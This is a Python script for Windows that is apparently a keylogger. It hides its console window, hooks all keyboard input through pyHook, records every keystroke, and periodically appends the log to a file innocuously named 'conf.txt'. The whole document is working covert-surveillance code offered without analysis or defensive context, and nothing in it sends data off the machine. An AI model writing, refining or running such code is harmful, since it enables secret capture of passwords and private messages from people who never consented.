import pyHook
import pythoncom
import win32console, win32gui

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

log=''

def logger():
    global log
    if len(log) > 100:
        fp = open("conf.txt", "a")
        fp.write(log)
        fp.close()
        log = ''
    return True


def keyspressed(event):
    global x, log
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.KeyID)
    log = log + keys
    logger()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keyspressed
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()